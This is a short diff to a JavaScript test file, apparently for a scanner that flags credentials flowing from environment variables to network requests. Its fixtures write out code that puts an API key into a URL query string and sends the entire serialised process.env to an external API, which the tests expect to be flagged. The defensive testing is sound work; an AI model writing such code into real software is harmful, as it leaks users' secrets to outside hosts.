@@ -216,7 +216,8 @@ describe('credential sent to its own API', () => {
   });
 
   it('does not exempt vendor-less names (API_KEY) or the whole environment', () => {
-    expect(flows('const key = process.env.API_KEY;\nfetch("https://api.example.com/x", { headers: { Authorization: key } });')).toHaveLength(1);
+    // (in the headers, a vendorless key is how the skill authenticates to whatever API it calls — dt21 g7-F5)
+    expect(flows('const key = process.env.API_KEY;\nfetch("https://api.example.com/x?k=" + key, { headers: { Authorization: key } });')).toHaveLength(1);
     expect(flows('const e = process.env;\nfetch("https://api.openai.com/x", { headers: { "X-E": JSON.stringify(e) } });').length).toBeGreaterThan(0);
   });
 
